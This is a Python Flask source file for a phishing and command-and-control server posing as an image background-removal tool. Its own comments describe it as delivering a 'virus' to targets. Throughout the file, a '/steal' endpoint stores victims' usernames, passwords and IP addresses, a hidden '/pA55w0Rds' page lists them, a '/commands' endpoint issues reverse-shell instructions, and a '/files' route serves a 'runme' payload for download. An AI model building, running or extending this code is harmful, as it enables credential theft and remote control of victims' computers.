from flask import Flask, render_template, request, jsonify, send_from_directory, flash, redirect, url_for, redirect, session
import os
import sqlite3
from werkzeug.security import generate_password_hash, check_password_hash
import secrets
import subprocess
import uuid

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY") or os.urandom(32)
REGISTRATION_KEY = secrets.token_urlsafe(32)

UPLOAD_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'uploads')
PROCESSED_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'processed')
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
app.config["PROCESSED_FOLDER"] = PROCESSED_FOLDER

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(PROCESSED_FOLDER, exist_ok=True)

DB_PATH = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data.db')

# Gets db connections
def get_db_connection():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# Initializes database
def create_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS data (
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        ip TEXT NOT NULL,
        timestamp TEXT
        );
    ''')
    cur.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL
        );
    ''')
    conn.commit()
    conn.close()

# Inserts stolen data into database
def insert_data(username, password, ip, timestamp):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO data(username, password, ip, timestamp) VALUES(?, ?, ?, ?)", (username, password, ip, timestamp))
    conn.commit()
    conn.close()

# Retrieves stolen info from database
def get_data():
    conn = get_db_connection()
    cur = conn.cursor()
    data = cur.execute("SELECT * FROM data").fetchall()
    conn.close()
    return data

# Homepage
@app.route("/")
def home():
    return render_template('home.html')

# Proceeds with removing background from image
@app.route("/proceed", methods=['GET', 'POST'])
def proceed():
    img = request.files.get("image")
    
    original_filename = img.filename

    # Generate unique filename so we don't accidently override
    extension = os.path.splitext(img.filename)[1]
    filename = f"{uuid.uuid4().hex}{extension}"
    
    # Save image to disk
    upload_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)
    img.save(upload_path)

    # Path for image with removed background
    processed_path = os.path.join(app.config["PROCESSED_FOLDER"], filename)
    
    subprocess.run(["backgroundremover", "-i", upload_path, "-o", processed_path])

    # Delete original upload
    os.remove(upload_path)

    flash("Image processed! Click download to get the PNG.", "success")
    return render_template("results.html", filename=original_filename, img=filename)

# Download page where the target will download the virus
@app.route("/results", methods=['GET', 'POST'])
def results():
    return render_template("results.html", img="15172b6d39724ad195241b1dd0e9bbff.png")

# Displays edited image
@app.route('/processed/<path:filename>')
def get_processed(filename):
    return send_from_directory(PROCESSED_FOLDER, filename)

# Stolen passwords page
@app.route("/pA55w0Rds")
def passwords():
    if 'username' in session:
        data = get_data()
        table_data = []
        for target in data:
            table_data.append([target['username'], target['password'], target['ip'], target['timestamp']])
        return render_template('passwords.html', data=table_data)
    else:
        return render_template('passwords.html')

# Form to send the sotlen info through
@app.route('/steal', methods=['POST'])
def steal():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.form.get('ip')
    timestamp = request.form.get('timestamp')
    insert_data(username, password, ip, timestamp)
    return ""

# Form to get commands to run
@app.route('/commands', methods=['POST'])
def command():
    type = request.form.get('type')
    if type=="REVERSE":
        port = request.form.get('port')
        ip = request.form.get('ip')
        return f'REVERSE port={port} ip={ip}'
    return ""

# Login route
@app.route('/login', methods=['POST'])
def login():
     if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = get_db_connection()
        cur = conn.cursor()
        # Retrieve hashed password for the given username
        cur.execute("SELECT password_hash FROM users WHERE username = ?", (username,))
        user_row = cur.fetchone()
        conn.close()

        # Checks hashed user password against database
        if user_row and check_password_hash(user_row['password_hash'], password):
            session['username'] = username
            flash('Login successful!', 'success')
            return redirect(url_for('passwords'))
        else:
            flash('Invalid username or password!', 'error')
            return redirect(url_for('passwords'))

# Form to register, only accesible via terminal commands
@app.route('/register', methods=['POST'])
def register():
    username = request.form.get('username')
    password = request.form.get('password')
    key = request.form.get('key')

    if key != REGISTRATION_KEY:
        return 'Invalid admin key — registration denied.'

    password_hash = generate_password_hash(password)
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)", (username, password_hash))
        conn.commit()
        conn.close()
        return 'User registered successfully.'
    except sqlite3.IntegrityError:
        return 'Username already exists.'
    
# Logout
@app.route('/logout', methods=['POST'])
def logout():
    session.pop('username')
    flash('Logged out successfully.', 'success')
    return redirect(url_for('passwords'))

# Deletes last entry in the database (for debugging)
@app.route('/delete-last', methods=['POST'])
def delete_last_entry():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("DELETE FROM data WHERE rowid = (SELECT rowid FROM data ORDER BY rowid DESC LIMIT 1)")
    conn.commit()
    conn.close()
    return 'Last entry deleted.'

# Just a page that will list all the files so we can retrieve them using wget
@app.route('/files/', methods=['POST'])
def list_files():
    files = ['runme'] #os.listdir('../')
    files_html = '\n'.join(
        f'<li><a href="/files/{file}">{file}</a></li>' for file in files
    )
    return f"<ul>{files_html}</ul>"
    
# Retrieving files
@app.route('/files/<path:filename>', methods=['POST'])
def download_file(filename):
    return send_from_directory('../', filename)    
    
if __name__ == "__main__":
    create_db()
    print(f"[DEBUG] Registration key: {REGISTRATION_KEY}")
    app.run(host='0.0.0.0', debug=False)
